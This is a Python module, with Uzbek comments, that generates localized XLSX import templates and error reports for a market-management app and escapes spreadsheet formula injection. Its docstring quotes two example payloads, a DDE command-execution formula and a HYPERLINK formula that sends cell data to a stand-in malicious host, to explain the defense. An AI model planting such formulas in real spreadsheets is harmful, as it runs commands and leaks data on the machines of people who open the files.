"""Import shabloni va xato hisoboti — `XlsxWriter` bilan (T-02-91).

=============================================================================
FORMULA INJECTION — HUJUM MIJOZ MASHINASIDA BAJARILADI.

Serverdan chiqqan `.xlsx` ni admin O'Z kompyuterida Excelda ochadi. Agar
katak `=`, `+`, `-`, `@`, `\\t` yoki `\\r` bilan boshlansa, Excel uni
FORMULA deb o'qiydi va ochilishi bilan BAJARADI. Klassik yuk:

    =cmd|'/c calc'!A1
    =HYPERLINK("http://zararli/?x="&A1,"Bosing")

Ma'lumot bizning bazamizdan keladi (zona nomi, toifa nomi, xato matni
ichidagi foydalanuvchi qiymati), ya'ni uni bir marta yozgan odam
KEYINCHALIK boshqa odamning mashinasida kod bajartiradi — bu saqlangan
hujum va u serverdan tashqarida portlaydi.

Himoya: `escape_formula()` — xavfli prefiksdan oldin `'` qo'yiladi
(OWASP CSV Injection). Excel `'` ni "bu matn" belgisi deb o'qiydi va
katakda ko'rsatmaydi.

⚠ HAR BIR YOZILADIGAN MATN SHU FUNKSIYADAN O'TADI — shablon ham, xato
hisoboti ham, sarlavha ham, namunaviy qator ham. Bitta o'tkazib
yuborilgan yo'l butun himoyani bekor qiladi, shuning uchun yozish
`_write_text()` YORDAMCHISI orqali va `worksheet.write()` to'g'ridan
-to'g'ri CHAQIRILMAYDI.
=============================================================================

⚠ O-05 — SHABLON FOYDALANUVCHI TILIDA, PARSER ESA POZITSIYA BO'YICHA.

Sarlavha qatori `locale` ga qarab uz-Latn / uz-Cyrl / ru da yoziladi,
lekin `import_validator` ustunlarni FAQAT POZITSIYA bo'yicha oladi va
sarlavha matnini UMUMAN o'qimaydi. Ya'ni ruscha shablonni yuklab olib
uzbekcha interfeysda import qilish ishlaydi, va til almashtirish
mavjud fayllarni eskirtirmaydi. Bu qoida `xlsx_reader` modul
docstringida ham yozilgan — ikkala tomon ham buni BILISHI shart.

YASHIRIN MA'LUMOTNOMA VARAG'I (Open Question 5): zona va toifa nomlari
ikkinchi, YASHIRIN varaqda yashaydi va birinchi varaqning tegishli
ustunlariga `data_validation` ro'yxati bilan bog'lanadi. Shu tufayli
admin nomni QO'LDA yozmaydi (`zone_not_found` xatolarining asosiy
sababi), ro'yxat esa shablon HAR SAFAR yangidan olingani uchun hech
qachon eskirmaydi — repoda nusxa saqlanmaydi.
"""

from __future__ import annotations

import io
from typing import TYPE_CHECKING, Any, Final

from app.services.xlsx_export import (
    FORMULA_PREFIXES,
    escape_formula,
    finish,
    new_workbook,
    write_text,
)

if TYPE_CHECKING:
    from collections.abc import Sequence

    from app.services.import_validator import ImportIssue

__all__ = [
    "ERROR_REPORT_COLUMNS",
    "FORMULA_PREFIXES",
    "TEMPLATE_KINDS",
    "build_error_report",
    "build_template",
    "escape_formula",
]

# ⚠ `FORMULA_PREFIXES` va `escape_formula` bu yerda QAYTA E'LON QILINADI,
#   TA'RIFLANMAYDI — ta'rif `app.services.xlsx_export` da (08-01).
#
#   08-PATTERNS §4 ularni shu faylda qoldirishni qat'iylashtirgan edi, lekin
#   bu modul endi `xlsx_export` dan `new_workbook`/`finish` ni oladi va
#   teskari import HALQA hosil qilardi. Halqa O'LCHANDI (taxmin emas):
#
#       ImportError: cannot import name 'FORMULA_PREFIXES' from partially
#       initialized module 'app.services.xlsx_template'
#
#   Yo'nalish shu sababdan BITTA: `xlsx_template` -> `xlsx_export`.
#   Qayta e'lon mavjud chaqiruvchilarni (`test_xlsx_template.py`,
#   `from app.services.xlsx_template import escape_formula`) SAQLAYDI,
#   ya'ni ta'rif bitta joyda turgani holda import yuzasi o'zgarmaydi.

TEMPLATE_KINDS: Final = ("stalls", "vendors", "staff", "ledger")
"""`GET /imports/template?kind=` qabul qiladigan qiymatlar.

⚠ `imports.py` dagi `Literal[...]` VA `_TEMPLATE_PERMISSIONS` bilan
QO'LDA sinxron saqlanadi (FastAPI so'rov parametrini `Literal` bilan
tekshiradi, bu ro'yxat esa ish vaqtidagi darvoza, xarita esa huquq).
Ajralib qolgan holatni `test_template_kinds_are_exactly_four`,
`test_the_three_template_registries_stay_in_sync` va `imports`
marshrutlarining OpenAPI darvozasi birgalikda ushlaydi.

⛔ TO'RTINCHI A'ZO (`ledger`, 08-14) DARVOZANI CHETLAB O'TMASDAN
   QO'SHILDI: `test_template_kinds_are_exactly_three` testi NOMI BILAN
   BIRGA `..._four` ga o'zgartirildi. Nom sonni aytadi, ya'ni to'plamning
   o'sishi diff'da KO'RINADI — testni o'chirish yoki nomni saqlab
   qiymatini almashtirish o'sha o'sishni JIMGINA qilardi (R-11).
"""

ERROR_REPORT_COLUMNS: Final = 3
"""Xato hisobotidagi ustunlar: `qator`, `kod`, `xabar`."""

_DEFAULT_LOCALE = "uz-Latn"

# Sarlavhalar TARJIMASI — SERVERDA, chunki fayl serverda hosil bo'ladi.
# Bu 1-faza D-16 ("DB kontenti bitta tilda") ga zid EMAS: bular DB
# kontenti emas, hosil qilinadigan hujjatning matni.
#
# Kalitlar `principal.locale` qiymatlari bilan bir xil. Noma'lum til
# uz-Latn ga tushadi (`_texts()`), ya'ni yangi til qo'shilganda fayl
# BUZILMAYDI — u shunchaki tarjimasiz chiqadi.
_TEXTS: Final[dict[str, dict[str, str]]] = {
    "uz-Latn": {
        "stalls_sheet": "Rastalar",
        "vendors_sheet": "Sotuvchilar",
        "reference_sheet": "Ma'lumotnoma",
        "errors_sheet": "Xatolar",
        "code": "kod",
        "zone": "zona",
        "category": "toifa",
        "status": "holat",
        "note": "izoh",
        "full_name": "F.I.Sh.",
        "phone": "telefon",
        "stall_code": "rasta kodi",
        "from_date": "boshlanish sanasi",
        "staff_sheet": "Xodimlar",
        "ledger_sheet": "Daftar",
        "ledger_amount": "daftar summasi",
        "role": "rol",
        "zones_header": "Zonalar",
        "categories_header": "Toifalar",
        "roles_header": "Rollar",
        "error_row": "qator",
        "error_code": "kod",
        "error_message": "xabar",
    },
    "uz-Cyrl": {
        "stalls_sheet": "Расталар",
        "vendors_sheet": "Сотувчилар",
        "reference_sheet": "Маълумотнома",
        "errors_sheet": "Хатолар",
        "code": "код",
        "zone": "зона",
        "category": "тоифа",
        "status": "ҳолат",
        "note": "изоҳ",
        "full_name": "Ф.И.Ш.",
        "phone": "телефон",
        "stall_code": "раста коди",
        "from_date": "бошланиш санаси",
        "staff_sheet": "Ходимлар",
        "ledger_sheet": "Дафтар",
        "ledger_amount": "дафтар суммаси",
        "role": "рол",
        "zones_header": "Зоналар",
        "categories_header": "Тоифалар",
        "roles_header": "Роллар",
        "error_row": "қатор",
        "error_code": "код",
        "error_message": "хабар",
    },
    "ru": {
        "stalls_sheet": "Прилавки",
        "vendors_sheet": "Продавцы",
        "reference_sheet": "Справочник",
        "errors_sheet": "Ошибки",
        "code": "номер",
        "zone": "зона",
        "category": "категория",
        "status": "статус",
        "note": "примечание",
        "full_name": "Ф.И.О.",
        "phone": "телефон",
        "stall_code": "номер прилавка",
        "from_date": "дата начала",
        "staff_sheet": "Сотрудники",
        "ledger_sheet": "Тетрадь",
        "ledger_amount": "сумма по тетради",
        "role": "роль",
        "zones_header": "Зоны",
        "categories_header": "Категории",
        "roles_header": "Роли",
        "error_row": "строка",
        "error_code": "код",
        "error_message": "сообщение",
    },
}

_STALL_HEADER_KEYS: Final = ("code", "zone", "category", "status", "note")
_VENDOR_HEADER_KEYS: Final = ("full_name", "phone", "stall_code", "from_date")
_STAFF_HEADER_KEYS: Final = ("full_name", "phone", "role")

_LEDGER_HEADER_KEYS: Final = ("stall_code", "ledger_amount")
"""⛔ DAFTAR SHABLONINING USTUNLARI — AYNAN IKKITA (UI-SPEC §10.3, D-17).

Uchinchi ustun (sotuvchi ismi, izoh, kassir F.I.Sh.) ⛔ QO'SHILMAYDI va
sabab mahsulotniki, uslubiy emas: daftar QOG'OZ va uni ko'chirayotgan
odam har ustunni QO'LDA yozadi — har qo'shimcha ustun 300–1000 qatorli
kunlik ishni sekinlashtiradi va oxir-oqibat importni butunlay tashlab
yuborishga olib boradi.

⚠ Sotuvchi ismi ayniqsa vasvasali ko'rinadi («kim to'ladi?»), lekin u
  daftarda ALLAQACHON yo'q ma'lumot emas — u TIZIMDA bor
  (`stall_assignments`), ya'ni uni faylga ko'chirish shaxsiy ma'lumotni
  ikkinchi marta, qo'lda yozib chiqishdan boshqa hech nima bermasdi.
"""

_SHEET_KEYS: Final[dict[str, str]] = {
    "stalls": "stalls_sheet",
    "vendors": "vendors_sheet",
    "staff": "staff_sheet",
    "ledger": "ledger_sheet",
}
_HEADER_KEYS: Final[dict[str, tuple[str, ...]]] = {
    "stalls": _STALL_HEADER_KEYS,
    "vendors": _VENDOR_HEADER_KEYS,
    "staff": _STAFF_HEADER_KEYS,
    "ledger": _LEDGER_HEADER_KEYS,
}

_STAFF_ROLE_COLUMN: Final = 2
"""`rol` ustunining 0-asosli indeksi — ochiluvchi ro'yxat shunga bog'lanadi.

`_STAFF_HEADER_KEYS` ning uchinchi elementi bilan mos bo'lishi SHART.
Ikkalasini bir joyga siqib bo'lmaydi: sarlavha ro'yxati matn kalitlari,
bu esa `data_validation` diapazoni.
"""

# Namunaviy qator — TARJIMA QILINMAYDI va bu ataylab. `holat` ustunidagi
# `active` — DB KONTENTI (`StallStatus`, 1-faza D-16), ya'ni uni ruscha
# yozish faylni ishlamaydigan qilardi. Qolgan qiymatlar esa haqiqiy
# zona/toifa nomlari bilan almashtiriladi (`_sample_row`).
_STALL_SAMPLE_STATUS: Final = "active"
_SAMPLE_PHONE: Final = "998901234567"
"""Namunaviy telefon — `+` SIZ (02-24 deviatsiya #1).

`+` `FORMULA_PREFIXES` da, ya'ni `escape_formula()` uni apostrof bilan
qochiradi va katakdagi qiymat `'+998901234567` bo'lib qoladi. O'sha
qiymat O'Z shablonining importida `invalid_phone` berardi. Bu ikkala
shablonga ham (`vendors`, `staff`) tegishli va u yerda ham AYNAN shu
qiymat ishlatiladi — ikki xil namunaviy shakl adminni chalg'itardi.
"""

_LEDGER_SAMPLE_AMOUNT: Final = "150000"
"""Namunaviy daftar summasi — BUTUN so'm, MINUSSIZ va bo'sh joysiz.

⛔ `-150000` YOKI `+150000` YOZILMAYDI: `-` va `+` ikkalasi ham
`FORMULA_PREFIXES` a'zosi, ya'ni `escape_formula()` ularni apostrof bilan
qochirardi va katakdagi qiymat `'-150000` bo'lib qolardi. O'sha qiymat O'Z
shablonining importida `ledger_amount_invalid` berardi — `_SAMPLE_PHONE`
da o'lchangan tuzoqning (02-24 deviatsiya #1) aynan takrori.

⚠ Ajratgich ham YO'Q (`150 000`, `150,000`): daftar summasi `int` bo'lib
  o'qiladi (C-6) va namunaga qo'yilgan ajratgich adminni "shunday yozish
  kerak ekan" degan xulosaga olib borardi.
"""

_STAFF_SAMPLE_ROLE: Final = "cashier"
"""Namunaviy rol — `Role.CASHIER` qiymati, TARJIMASIZ (D-16).

`cashier` ikkala darajada ham ruxsat etilgan (`assignable_roles` ning
har ikkala natijasida bor), ya'ni namunaviy qator O'ZGARTIRILMASDAN
import qilinganda ham `role_not_allowed` bermaydi.
"""


def build_template(
    kind: str,
    locale: str,
    zones: Sequence[str],
    categories: Sequence[str],
    *,
    roles: Sequence[str] = (),
) -> bytes:
    """Import shablonini hosil qiladi (`stalls` / `vendors` / `staff` / `ledger`).

    Fayl HAR SAFAR yangidan quriladi va repoda nusxa saqlanmaydi
    (Open Question 5): zona nomi tahrirlanganda keyingi yuklab olishda
    ro'yxat AVTOMATIK yangilanadi.

    `roles` — FAQAT `staff` uchun va u chaqiruvchining D-04 darajasidan
    keladi (`staff_accounts.assignable_roles`). Kalit-so'zli va standart
    bo'sh: mavjud ikkita chaqiruv o'zgarmaydi. Ro'yxatni shu yerda
    `Role` enum'idan qurish ikkinchi haqiqat manbaini tug'dirardi —
    shablon bozor admini berolmaydigan rolni taklif qilardi va u
    `role_not_allowed` bilan qaytardi.

    Raises:
        ValueError: noma'lum `kind`.
    """
    if kind not in TEMPLATE_KINDS:
        raise ValueError(f"noma'lum shablon turi: {kind!r}")

    texts = _texts(locale)
    buffer = io.BytesIO()
    workbook = new_workbook(buffer)
    try:
        header_format = workbook.add_format({"bold": True, "bg_color": "#F2F2F2"})
        worksheet = workbook.add_worksheet(texts[_SHEET_KEYS[kind]])

        for column, key in enumerate(_HEADER_KEYS[kind]):
            _write_text(worksheet, 0, column, texts[key], header_format)
            worksheet.set_column(column, column, 18)

        for column, value in enumerate(_sample_row(kind, zones, categories)):
            _write_text(worksheet, 1, column, value)

        # Sarlavha qatori MUZLATILADI: 1000 qatorli faylda pastga
        # tushgan admin qaysi ustun nima ekanini ko'rmay qolardi.
        worksheet.freeze_panes(1, 0)

        _reference_sheet(workbook, worksheet, texts, kind, zones, categories, roles)
    except BaseException:
        # ⚠ `finally: close()` EMAS — muvaffaqiyatli yo'lda kitobni
        #   `finish()` yopadi va ikki marta yopish `XlsxWriter` da
        #   ikkinchi (yarim) faylni yozardi. Nosoz yo'lda esa resurs
        #   baribir bo'shatiladi va istisno O'ZGARISHSIZ ko'tariladi.
        workbook.close()
        raise
    return finish(workbook, buffer)


def build_error_report(issues: Sequence[ImportIssue], locale: str) -> bytes:
    """422 javobidagi xatolarni `.xlsx` ga yozadi (UI-SPEC §8.5).

    UI faqat BIRINCHI 50 xatoni ko'rsatadi (300 ta DOM elementi
    skrinrider uchun foydasiz), fayl esa BERILGANLARNING HAMMASINI
    oladi — 300 xatoni brauzerda emas, Excelda tuzatiladi.
    """
    texts = _texts(locale)
    buffer = io.BytesIO()
    workbook = new_workbook(buffer)
    try:
        header_format = workbook.add_format({"bold": True, "bg_color": "#F2F2F2"})
        worksheet = workbook.add_worksheet(texts["errors_sheet"])

        for column, key in enumerate(("error_row", "error_code", "error_message")):
            _write_text(worksheet, 0, column, texts[key], header_format)
        worksheet.set_column(0, 0, 8)
        worksheet.set_column(1, 1, 26)
        worksheet.set_column(2, 2, 80)

        for offset, issue in enumerate(issues, start=1):
            # `row` — SON, ya'ni `escape_formula()` dan o'tmaydi va
            # o'tishi ham kerak emas: Excelda u bo'yicha SARALASH
            # mumkin bo'lishi kerak (matn sifatida "100" "20" dan
            # oldin turardi).
            worksheet.write_number(offset, 0, issue.row)
            _write_text(worksheet, offset, 1, issue.code)
            _write_text(worksheet, offset, 2, issue.message)

        worksheet.freeze_panes(1, 0)
        worksheet.autofilter(0, 0, max(len(issues), 1), ERROR_REPORT_COLUMNS - 1)
    except BaseException:
        # `build_template()` dagi bilan AYNI sabab — o'sha izohga qarang.
        workbook.close()
        raise
    return finish(workbook, buffer)


def _texts(locale: str) -> dict[str, str]:
    """Til uchun matnlar; noma'lum til uz-Latn ga tushadi.

    Istisno KO'TARILMAYDI: yangi til qo'shilganda (yoki tokendagi
    qiymat kutilmagan bo'lsa) shablonni yuklab olish 500 bilan
    tugashi — usta oqimini butunlay to'sadigan, sababi esa mutlaqo
    ahamiyatsiz nosozlik bo'lardi.
    """
    return _TEXTS.get(locale, _TEXTS[_DEFAULT_LOCALE])


def _sample_row(
    kind: str,
    zones: Sequence[str],
    categories: Sequence[str],
) -> tuple[str, ...]:
    """Bitta namunaviy qator — HAQIQIY zona/toifa nomlari bilan.

    Namuna to'qib chiqarilgan nom bilan to'ldirilsa (masalan
    `"Zona nomi"`), uni tahrirlashni unutgan admin DARHOL
    `zone_not_found` olardi. Haqiqiy nom esa namunani ham, ko'rsatmani
    ham bir vaqtda bajaradi.

    ⚠ TELEFON `+` SIZ YOZILADI VA BU MAJBURIY, "uslub" EMAS (02-24).
    `+` — `FORMULA_PREFIXES` a'zosi, ya'ni `escape_formula()` uni
    apostrof bilan qochiradi (TO'G'RI xulq) va katakda `'+998901234567`
    qoladi. `normalize_phone()` esa apostrofni raqam deb qabul qilmaydi,
    ya'ni namunaviy qator O'Z shablonining importidan `invalid_phone`
    bilan qaytardi. `998901234567` — `normalize_phone` qabul qiladigan va
    admin AMALDA yozadigan shakl; `test_staff_sample_row_is_accepted_by_
    the_validator` shu aylanmani qulflaydi.
    """
    zone = zones[0] if zones else ""
    category = categories[0] if categories else ""
    if kind == "stalls":
        return ("1", zone, category, _STALL_SAMPLE_STATUS, "")
    if kind == "ledger":
        # ⚠ SUMMA MATN SIFATIDA YOZILADI (butun fayl `_write_text()` dan
        #   o'tadi) va `validate_ledger_rows()` uni `int` ga keltiradi:
        #   o'quvchi qatlam (`xlsx_reader`) baribir HAR katakni satr qilib
        #   beradi, ya'ni bu yerda son yozish parser uchun hech nima
        #   o'zgartirmasdi, qochirish yo'lini esa ikkiga bo'lardi.
        return ("1", _LEDGER_SAMPLE_AMOUNT)
    if kind == "staff":
        # ⚠ `cashier` TARJIMA QILINMAYDI — u DB KONTENTI (`Role`, 1-faza
        # D-16), aynan `_STALL_SAMPLE_STATUS` dagi `active` bilan bir xil
        # sabab: ruscha yozilgan qiymat faylni ishlamaydigan qilardi.
        return ("Aliyev Vali", _SAMPLE_PHONE, _STAFF_SAMPLE_ROLE)
    return ("Aliyev Vali", _SAMPLE_PHONE, "1", "2026-01-15")


def _reference_sheet(
    workbook: Any,
    target: Any,
    texts: dict[str, str],
    kind: str,
    zones: Sequence[str],
    categories: Sequence[str],
    roles: Sequence[str],
) -> None:
    """Yashirin ma'lumotnoma varag'i + `data_validation` ro'yxatlari.

    Varaq YASHIRIN (`hide()`): u admin uchun emas, Excel uchun. Ko'rinib
    turgan ikkinchi varaq "buni ham to'ldirishim kerakmi?" degan savol
    tug'dirardi.

    ⚠ `data_validation` — QULAYLIK, DARVOZA EMAS. Excel ro'yxatdan
    tashqari qiymat kiritishga ruxsat beradi (va boshqa dastur uni
    umuman o'qimaydi), ya'ni haqiqiy tekshiruv baribir SERVERDA
    (`import_validator`). Bu yerdagi ro'yxat faqat `zone_not_found` /
    `invalid_role` xatolarining eng ko'p uchraydigan sababini — qo'lda
    yozishdagi xatoni — yo'q qiladi.

    TO'RT TURDAN IKKITASIDA VARAQ QURILADI:
      `stalls` — zona va toifa nomlari;
      `staff`  — chaqiruvchi bera oladigan ROL qiymatlari (D-04);
      `vendors` — HECH NARSA, va bu ATAYIN: rasta kodi ro'yxati minglab
        element bo'lishi mumkin va uni ochiluvchi ro'yxatga aylantirish
        faylni foydasiz kattalashtirardi;
      `ledger` — HECH NARSA, `vendors` bilan AYNAN bir xil sabab: uning
        birinchi ustuni ham rasta KODI (08-14).
    """
    if kind == "staff":
        _staff_reference_sheet(workbook, target, texts, roles)
        return
    if kind != "stalls" or not (zones or categories):
        return

    reference = workbook.add_worksheet(texts["reference_sheet"])
    _write_text(reference, 0, 0, texts["zones_header"])
    _write_text(reference, 0, 1, texts["categories_header"])
    for index, name in enumerate(zones, start=1):
        _write_text(reference, index, 0, name)
    for index, name in enumerate(categories, start=1):
        _write_text(reference, index, 1, name)
    reference.hide()

    sheet_name = _quote_sheet_name(texts["reference_sheet"])
    last_row = max(len(zones), len(categories), 1) + 1
    if zones:
        target.data_validation(
            1,
            1,
            last_row,
            1,
            {"validate": "list", "source": f"={sheet_name}!$A$2:$A${len(zones) + 1}"},
        )
    if categories:
        target.data_validation(
            1,
            2,
            last_row,
            2,
            {"validate": "list", "source": f"={sheet_name}!$B$2:$B${len(categories) + 1}"},
        )


def _staff_reference_sheet(
    workbook: Any,
    target: Any,
    texts: dict[str, str],
    roles: Sequence[str],
) -> None:
    """Rol ro'yxati — YASHIRIN varaqning A ustunida, `rol` ustuniga bog'langan.

    Ro'yxat CHAQIRUVCHINING darajasidan keladi, `Role` enum'idan EMAS:
    bozor admini `director` ni tanlab, keyin `role_not_allowed` olishi
    ustaning eng bema'ni yo'li bo'lardi — tanlov ro'yxati aynan
    ruxsat etilgan to'plamni ko'rsatishi kerak.
    """
    if not roles:
        return

    reference = workbook.add_worksheet(texts["reference_sheet"])
    _write_text(reference, 0, 0, texts["roles_header"])
    for index, name in enumerate(roles, start=1):
        _write_text(reference, index, 0, name)
    reference.hide()

    sheet_name = _quote_sheet_name(texts["reference_sheet"])
    target.data_validation(
        1,
        _STAFF_ROLE_COLUMN,
        len(roles) + 1,
        _STAFF_ROLE_COLUMN,
        {"validate": "list", "source": f"={sheet_name}!$A$2:$A${len(roles) + 1}"},
    )


def _quote_sheet_name(name: str) -> str:
    """Varaq nomini formula uchun qo'shtirnoqqa oladi.

    Nomda bo'sh joy yoki apostrof bo'lsa (`Ma'lumotnoma` — AYNAN shu
    holat) qo'shtirnoqsiz havola Excelda buzilardi va ochiluvchi
    ro'yxat jimgina ishlamay qolardi. Ichki apostrof ikkilantiriladi —
    bu Excel formulasining O'Z qoidasi.
    """
    return "'" + name.replace("'", "''") + "'"


def _write_text(
    worksheet: Any,
    row: int,
    column: int,
    value: str,
    cell_format: Any = None,
) -> None:
    """Shu moduldagi YAGONA matn yozish yo'li — `xlsx_export.write_text` ga o'tadi.

    ⚠ Bu yordamchi ENDI QOCHIRISHNI O'ZI BAJARMAYDI. 08-01 gacha u
    `worksheet.write_string(..., escape_formula(value), ...)` ni o'zi
    chaqirardi, ya'ni repoda IKKI qochirish yo'li bor edi: bu yerdagi va
    eksport modulidagi. Ikki yo'l bir kun ajralib ketardi — masalan yangi
    prefiks (`FORMULA_PREFIXES` ga qo'shilgan belgi) faqat bittasida
    hisobga olinardi va himoya JIMGINA yarim ishlardi.

    Yordamchining O'ZI saqlanadi (08-PATTERNS §4): u shu modulning 40 ga
    yaqin chaqiruv joyini qisqartiradi va nomi bilan "matn shu yerdan
    yoziladi" qoidasini o'qiladigan qiladi.
    """
    write_text(worksheet, row, column, value, cell_format)
